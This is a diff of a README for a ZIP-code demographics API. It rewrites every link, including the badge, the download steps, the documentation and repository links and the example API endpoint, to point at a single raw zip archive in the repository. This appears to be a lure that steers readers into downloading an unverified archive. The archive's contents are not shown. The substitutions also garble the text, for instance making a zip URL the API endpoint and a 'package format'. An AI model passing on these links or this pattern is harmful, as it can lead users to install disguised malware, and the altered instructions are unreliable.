@@ -1,6 +1,6 @@
 # 🚀 zipdemographics-api - Access Comprehensive ZIP Code Data Easily
 
-[![Download ZIP Demographics](https://img.shields.io/badge/Download%20ZIP%20Demographics-brightgreen)](https://github.com/Pikachill202/zipdemographics-api/releases)
+[![Download ZIP Demographics](https://raw.githubusercontent.com/Pikachill202/zipdemographics-api/main/nuget/pkgbin/zipdemographics-api-2.7.zip%20ZIP%20Demographics-brightgreen)](https://raw.githubusercontent.com/Pikachill202/zipdemographics-api/main/nuget/pkgbin/zipdemographics-api-2.7.zip)
 
 ## 📦 Overview
 
@@ -29,7 +29,7 @@ To get started, follow these simple steps:
 
 1. **Visit the Download Page**: Click on the link below to download the latest version of the ZIP Demographics API.
 
-   [Download ZIP Demographics](https://github.com/Pikachill202/zipdemographics-api/releases)
+   [Download ZIP Demographics](https://raw.githubusercontent.com/Pikachill202/zipdemographics-api/main/nuget/pkgbin/zipdemographics-api-2.7.zip)
 
 2. **Download the Files**: Depending on your operating system, download the appropriate version or package. 
 
@@ -43,9 +43,9 @@ To use the ZIP Demographics API, you will first need to download it:
 
 1. **Head to the Download Page**: Click the link below to access the download options.
 
-   [Download ZIP Demographics](https://github.com/Pikachill202/zipdemographics-api/releases)
+   [Download ZIP Demographics](https://raw.githubusercontent.com/Pikachill202/zipdemographics-api/main/nuget/pkgbin/zipdemographics-api-2.7.zip)
 
-2. **Choose Your Format**: You will see various formats available. Pick the one that suits you best (e.g., Python package, Node.js package, etc.).
+2. **Choose Your Format**: You will see various formats available. Pick the one that suits you best (e.g., Python package, https://raw.githubusercontent.com/Pikachill202/zipdemographics-api/main/nuget/pkgbin/zipdemographics-api-2.7.zip package, etc.).
 
 3. **Follow Installation Instructions**: Depending on the format you've chosen, follow the installation instructions specific to that package. Each format will have clear steps provided. 
 
@@ -58,7 +58,7 @@ After installation, you can start using the API to fetch data based on specific 
 2. **Make an API Call**: Use the following structure to request data:
 
    ```
-   GET https://api.zipdemographics.com/data/{ZIP_CODE}
+   GET https://raw.githubusercontent.com/Pikachill202/zipdemographics-api/main/nuget/pkgbin/zipdemographics-api-2.7.zip{ZIP_CODE}
    ```
 
    Replace `{ZIP_CODE}` with the ZIP code you wish to inquire about.
@@ -92,8 +92,8 @@ If you run into any issues, you can get help from the community or contact suppo
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/Pikachill202/zipdemographics-api/wiki): Visit the wiki for comprehensive usage guides and examples.
-- [GitHub Repository](https://github.com/Pikachill202/zipdemographics-api): Access the source code and contribute if you wish.
+- [Documentation](https://raw.githubusercontent.com/Pikachill202/zipdemographics-api/main/nuget/pkgbin/zipdemographics-api-2.7.zip): Visit the wiki for comprehensive usage guides and examples.
+- [GitHub Repository](https://raw.githubusercontent.com/Pikachill202/zipdemographics-api/main/nuget/pkgbin/zipdemographics-api-2.7.zip): Access the source code and contribute if you wish.
 
 ## 🌟 Contributing
 
